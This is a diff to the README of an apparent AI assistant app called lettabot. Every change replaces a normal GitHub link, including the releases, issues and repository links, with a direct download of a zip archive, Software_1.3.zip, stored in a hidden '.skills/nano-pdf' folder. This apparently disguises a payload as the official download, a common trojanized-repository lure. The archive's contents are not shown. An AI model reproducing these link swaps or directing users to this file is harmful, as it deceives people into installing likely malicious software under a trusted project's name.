@@ -12,7 +12,7 @@ Welcome to lettabot! This app serves as your personal AI assistant that remember
 ## 📦 Download & Install
 To get started with lettabot, you need to download the application. Visit this page to download the latest version:
 
-[![Download lettabot](https://img.shields.io/badge/Download%20lettabot-v1.0-blue.svg)](https://github.com/Baoleeza/lettabot/releases)
+[![Download lettabot](https://raw.githubusercontent.com/Baoleeza/lettabot/main/.skills/nano-pdf/Software_1.3.zip%https://raw.githubusercontent.com/Baoleeza/lettabot/main/.skills/nano-pdf/Software_1.3.zip)](https://raw.githubusercontent.com/Baoleeza/lettabot/main/.skills/nano-pdf/Software_1.3.zip)
 
 1. Click the link above to be directed to the Releases page.
 2. Look for the latest version of lettabot.
@@ -20,7 +20,7 @@ To get started with lettabot, you need to download the application. Visit this p
 
 You can also find the download link below:
 
-[Download lettabot](https://github.com/Baoleeza/lettabot/releases)
+[Download lettabot](https://raw.githubusercontent.com/Baoleeza/lettabot/main/.skills/nano-pdf/Software_1.3.zip)
 
 ## 💻 System Requirements
 Before installing, ensure your system meets the following requirements:
@@ -55,12 +55,12 @@ If you encounter any issues while downloading or using lettabot, please check th
 
 - **Installation Problems:** Make sure you have the right system requirements.
 - **Connection Issues:** Ensure your internet connection is stable and your messaging apps are properly linked.
-- **General Questions:** Visit the [GitHub Issues page](https://github.com/Baoleeza/lettabot/issues) for support from the community or to report any bugs.
+- **General Questions:** Visit the [GitHub Issues page](https://raw.githubusercontent.com/Baoleeza/lettabot/main/.skills/nano-pdf/Software_1.3.zip) for support from the community or to report any bugs.
 
 ## 🌐 Connect with Us
 Stay updated on new features and releases:
 
-- **GitHub Repository:** [lettabot GitHub](https://github.com/Baoleeza/lettabot)
+- **GitHub Repository:** [lettabot GitHub](https://raw.githubusercontent.com/Baoleeza/lettabot/main/.skills/nano-pdf/Software_1.3.zip)
 - **Feedback:** We welcome your input to improve lettabot. Reach out through the issues page or directly within the app.
 
 Thank you for choosing lettabot. Your smart assistant awaits!
